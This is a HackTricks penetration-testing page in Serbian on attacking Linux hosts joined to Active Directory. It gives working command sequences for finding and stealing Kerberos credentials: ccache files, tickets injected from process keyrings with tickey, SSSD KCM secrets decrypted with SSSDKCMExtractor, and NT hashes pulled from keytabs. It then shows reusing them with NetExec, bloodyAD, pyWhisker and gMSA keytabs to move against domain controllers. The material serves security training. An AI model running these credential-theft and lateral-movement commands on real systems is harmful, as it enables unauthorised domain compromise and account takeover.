# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Linux mašina takođe može biti prisutna u Active Directory okruženju.

Linux mašina unutar AD-a može **lokalno čuvati Kerberos materijal**: korisničke ccaches, keytab-ove mašina/servisa i tajne kojima upravlja SSSD. Ovi artefakti se obično mogu ponovo koristiti kao bilo koji drugi Kerberos credential. Da biste pročitali većinu njih, moraćete biti vlasnik ticket-a ili **root** na mašini.

## Enumeracija

### AD enumeracija iz Linuxa

Ako imate pristup AD-u iz Linuxa (ili bash-u u Windowsu), možete pokušati sa [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) da izvršite enumeraciju AD-a.

Takođe možete pogledati sledeću stranicu da biste saznali **druge načine za enumeraciju AD-a iz Linuxa**:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA je open-source **alternativa** za Microsoft Windows **Active Directory**, prvenstveno namenjena **Unix** okruženjima. Kombinuje kompletan **LDAP directory** sa MIT **Kerberos** Key Distribution Center-om za upravljanje slično Active Directory-ju. Korišćenjem Dogtag **Certificate System**-a za upravljanje CA i RA sertifikatima, podržava **multi-factor** autentifikaciju, uključujući smartcards. SSSD je integrisan za Unix procese autentifikacije. Saznajte više o tome na:


{{#ref}}
../software-information/freeipa-pentesting.md
{{#endref}}

### Artefakti hosta pridruženog domenu

Pre nego što počnete da radite sa ticket-ima, utvrdite **kako je host pridružen AD-u** i **gde se Kerberos materijal zaista čuva**. Na modernim Linux hostovima ovim se obično upravlja pomoću `realmd` + `adcli` + `sssd`, a ne samo pomoću običnih fajlova u `/tmp`:
```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```
Ovo vam brzo govori da li host veruje AD-u, da li SSSD kešira identitete ili ticket-e i da li su **machine/service keytab** ili **KCM secrets** dostupni za zloupotrebu.

## Rad sa ticket-ima

### Pass The Ticket

Na ovoj stranici pronaći ćete različita mesta na kojima možete **pronaći Kerberos ticket-e unutar Linux hosta**. Na sledećoj stranici možete naučiti kako da transformišete ove CCache formate ticket-a u Kirbi (format koji je potreban za korišćenje u Windows-u), kao i kako da izvršite PTT napad:


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

Ako želite **Linux-specifične workflow-e za prikupljanje ticket-a** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc`, itd.), pogledajte posebnu stranicu:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### Ponovna upotreba CCACHE ticket-a iz /tmp

CCACHE datoteke su binarni formati za **čuvanje Kerberos kredencijala**. `FILE:/tmp/krb5cc_%{uid}` je i dalje uobičajen, ali moderne Linux implementacije takođe koriste `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}` ili `KCM:%{uid}`. Proverite promenljivu okruženja **`KRB5CCNAME`** i podešavanje `default_ccache_name` pre nego što pretpostavite da se ticket-i nalaze u `/tmp`.<sup>[[1]](#references)</sup>
```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```
### Ponovna upotreba CCACHE ticket-a iz keyring-a

**Kerberos ticket-i sačuvani u memoriji procesa mogu biti izvučeni**, naročito kada je ptrace zaštita mašine onemogućena (`/proc/sys/kernel/yama/ptrace_scope`). Koristan tool za ovu svrhu nalazi se na [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), koji olakšava ekstrakciju ubacivanjem u sesije i dump-ovanjem ticket-a u `/tmp`.

Za konfiguraciju i korišćenje ovog tool-a prate se sledeći koraci:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Ova procedura će pokušati da izvrši injekciju u različite sesije, što će označiti kao uspešno čuvanjem ekstrahovanih ticket-a u `/tmp`, uz konvenciju imenovanja `__krb_UID.ccache`.<sup>[[1]](#references)</sup>

### Ponovna upotreba CCACHE ticket-a iz SSSD KCM-a

SSSD održava kopiju baze podataka na putanji `/var/lib/sss/secrets/secrets.ldb`. Odgovarajući ključ je sačuvan kao skrivena datoteka na putanji `/var/lib/sss/secrets/.secrets.mkey`. Podrazumevano, ključ je čitljiv samo ako imate **root** privilegije.

Pozivanje **`SSSDKCMExtractor`** sa parametrima --database i --key će analizirati bazu podataka i **dešifrovati tajne**.
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
**Kerberos blob keša akreditiva može se konvertovati u upotrebljivu Kerberos CCache** datoteku koja se može proslediti alatima Mimikatz/Rubeus.

### Brza analiza keytab-a
```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```
### Izdvajanje naloga iz /etc/krb5.keytab

Ključevi servisnih naloga, neophodni za servise koji rade sa root privilegijama, bezbedno se čuvaju u datotekama **`/etc/krb5.keytab`**. Ovi ključevi, slični lozinkama za servise, zahtevaju strogu poverljivost.

Za pregled sadržaja keytab datoteke može se koristiti **`klist`**. Na Linuxu, `klist -k -K -e` prikazuje principal imena, brojeve verzija ključeva, tipove enkripcije i sirovi materijal ključa. Ako je tip ključa **23 / RC4-HMAC**, vrednost ključa je takođe **NT hash** tog principala.
```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```
Za korisnike Linuxa, **`KeyTabExtract`** pruža funkcionalnost za izdvajanje RC4 HMAC hash-a, koji se može iskoristiti za ponovnu upotrebu NTLM hash-a. Imajte na umu da ovo pomaže samo kada keytab i dalje sadrži materijal **etype 23 / RC4-HMAC**. U okruženjima koja koriste samo **AES** možda nećete dobiti NT hash koji može da se ponovo koristi, ali se i dalje možete direktno autentifikovati pomoću keytab-a putem Kerberos-a.
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
Na macOS-u, **`bifrost`** služi kao alat za analizu keytab datoteka.
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
Korišćenjem izvučenih informacija o nalozima i hash vrednostima, veze sa serverima mogu se uspostaviti pomoću alata kao što je **`NetExec`**.
```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache netexec smb <DC_FQDN> --use-kcache
```
### Ponovna upotreba naloga računara iz `/etc/krb5.keytab`

Na sistemima pridruženim pomoću `realmd`/`adcli`/`sssd`, `/etc/krb5.keytab` obično sadrži **nalog računara** i jedan ili više **host/service principals**. Ako imate **root**, nemojte ga samo dump-ovati: upotrebite jedan od principal-a koje navodi `klist -k` da zatražite TGT i radite kao sam Linux host.
```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```
Ovo je posebno korisno kada sam **objekat računara** ima delegirana prava u AD-u ili kada je hostu dozvoljeno da preuzme druge secrets, kao što je **gMSA**.

### Ponovna upotreba ukradenog Kerberos materijala sa Linux-first AD alatima

Kada imate validan `ccache` ili upotrebljiv keytab, možete raditi sa AD-om **direktno iz Linux-a**, bez prethodnog konvertovanja svega u Windows formate. Mnogi moderni alati nativno prihvataju `KRB5CCNAME` / Kerberos autentikaciju:
```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
--target 'WEB01$' --action list
```
Ovo je dobra veza između **Linux post-exploitation** i zloupotrebe AD objekata. Za same načine zloupotrebe na nivou objekata pogledajte:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Linux gMSA / Managed Service Account artefakti

Novije Linux implementacije mogu direktno da koriste **Managed Service Accounts** iz AD-a. U praksi to znači da, nakon kompromitovanja Linux servera, možete pronaći ne samo host keytab već i **service-specific keytabs** generisane iz gMSA-a. Uobičajena mesta za proveru su `/etc/gmsad.conf`, konfiguracioni fajlovi specifični za implementaciju i dodatni `*.keytab` fajlovi u okviru direktorijuma `/etc`.<sup>[[2]](#references)</sup>
```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```
Ovo vam daje ponovo upotrebljiv Kerberos identitet za SPN-ove povezane sa tim gMSA, **bez pristupanja bilo kojoj Windows endpoint tački**. Za **domain-side** zloupotrebu gMSA/dMSA nakon sticanja viših privilegija u AD-u pogledajte:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## Reference

- [1] [Kerberos (II): Kako napasti Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [Pristup AD-u pomoću managed service account-a – Direktna integracija RHEL sistema sa Active Directory-jem](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)

{{#include ../../banners/hacktricks-training.md}}
